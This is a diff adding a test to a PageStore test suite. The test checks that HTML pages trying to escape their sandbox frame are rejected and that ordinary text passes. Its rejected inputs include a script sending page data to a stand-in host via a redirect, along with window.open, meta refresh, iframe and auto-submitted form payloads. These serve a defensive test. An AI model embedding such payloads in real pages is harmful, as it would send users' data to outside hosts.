@@ -285,6 +285,30 @@ describe("PageStore HTML pages", () => {
     expect(() => pages.writeHtml("nope", { id: "x", title: "X", html: "<p>" })).toThrow(/unknown project/);
   });
 
+  it("refuses a page that would try to leave its frame, naming what, and lets ordinary words and code through", () => {
+    const leaving = [
+      "<script>location.href = 'https://x.example/?d=' + data</script>",
+      "<script>window.open('https://x.example')</script>",
+      "<form><input name=q></form>",
+      "<script>document.querySelector('form').submit()</script>",
+      '<meta http-equiv="refresh" content="0;url=https://x.example">',
+      '<link rel="prerender" href="https://x.example">',
+      '<a href="https://x.example" target="_blank">x</a>',
+      '<a href="/x" download>x</a>',
+      '<iframe src="https://x.example"></iframe>',
+      '<script type="speculationrules">{}</script>',
+      '<button onclick="location.assign(1)">go</button>',
+    ];
+    for (const html of leaving) expect(() => pages.writeHtml("budget", { id: "x", title: "X", html }), html).toThrow(/cannot leave its frame/);
+    expect(() =>
+      pages.writeHtml("budget", {
+        id: "ok",
+        title: "Ok",
+        html: '<meta charset="utf-8"><p>Pick a location. Fill the form below.</p><script>const target = document.body; if (x == location) {}</script>',
+      }),
+    ).not.toThrow();
+  });
+
   it("keeps every write as a version and rolls back to one, the rollback kept too", () => {
     pages.writeHtml("budget", { id: "b", title: "One", html: "<p>one</p>" });
     pages.writeHtml("budget", { id: "b", title: "Two", html: "<p>two</p>" });
